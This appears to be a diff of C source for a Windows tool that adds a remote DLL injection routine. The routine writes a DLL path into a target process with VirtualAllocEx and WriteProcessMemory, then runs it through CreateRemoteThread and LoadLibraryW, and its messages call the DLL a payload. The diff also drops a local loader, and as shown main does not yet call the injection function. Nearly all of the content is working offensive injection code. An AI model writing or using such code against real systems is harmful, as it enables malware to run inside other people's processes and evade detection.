@@ -41,36 +41,87 @@ BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessID, OUT
 	} while (Process32Next(hSnapShot, &Proc));
 
 	// Close the handle to the snapshot
-	_EndOfFunction:
-		if(hSnapShot !=NULL)
-			CloseHandle(hSnapShot);
-		if (*dwProcessID == NULL || *hProcess == NULL)
-			return FALSE;
-		return TRUE;
+_EndOfFunction:
+	if (hSnapShot != NULL)
+		CloseHandle(hSnapShot);
+	if (*dwProcessID == NULL || *hProcess == NULL)
+		return FALSE;
+	return TRUE;
+}
+
+//Function to inject the payload into the remote process
+BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
+	BOOL		bSTATE = TRUE;
+	LPVOID		pLoadLibraryW = NULL;
+	LPVOID		pAddress = NULL;
+
+	// fetching the size of DllName in bytes
+	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
+	SIZE_T		lpNumberOfBytesWritten = NULL;
+	HANDLE		hThread = NULL;
+
+	//Load LoadLibraryW WinAPI Function by opening a handle to kernel32.dll
+	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+	if (pLoadLibraryW == NULL) {
+		printf("[!] GetProcAddress Failed With Error Code: %d\n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+
+	//Allocate Memory in the remote process to store the Dll Name
+	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (pAddress == NULL) {
+		printf("[!] VirtualAllocEx Failed With Error Code: %d\n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+
+	printf("[i] pAddress Allocated At : 0x%p Of Size : %d Bytes\n", pAddress, dwSizeToWrite);
+
+	//Write the Dll Name to the allocated memory
+	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)) {
+		printf("[!] WriteProcessMemory Failed With Error Code: %d\n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+
+	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
+	printf("[i] Dll Name Written To The Remote Process\n");
+
+	printf("[i] Executing Payload ...\n");
+	printf("[+] Creating Remote Thread To Load The Dll\n");
+
+	//Executing the payload by creating a new remote thread
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
+	if (hThread == NULL) {
+		printf("[!] CreateRemoteThread Failed With Error Code: %d\n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+
+	printf("[+] Remote Thread Created Successfully\n");
+
+_EndOfFunction:
+	if (hThread) {
+		CloseHandle(hThread);
+	}
+	return bSTATE;
+
 }
 
 int main(int argc, char* argv[]) {
-	
+
 	// Get Command Line Arguments
 	if (argc < 2) {
-		printf("[!] Missing Argument; Payload File to run\n");
+		printf("[!] Missing Argument; Usage: <Complete Path to Dll File> <Target Process Name>\n");
 		return -1;
 	}
 
-	printf("[*] Running Dll Payload: %s\n", argv[1]);
-	
-	// Load the Dll into the local process
-	printf("[i] Injecting \"%s\" To The Local Process Of Pid: %d\n", argv[1], GetCurrentProcessId());
-	printf("[+] Loading Dll ...");
-	if (LoadLibraryA(argv[1]) == NULL) {
-		printf("[!] Loadlibrary Failed With Error Code: %d\n", GetLastError());
-		return -1;
-	}
-	printf("[+] Payload Loaded Successfully\n");
+	printf("[*] Using Dll Payload: %s\n", argv[1]);
 
 	//End
 	printf("[#] Press Any Key To Exit\n");
 	getchar();
 
 	return 0;
-}	
+}
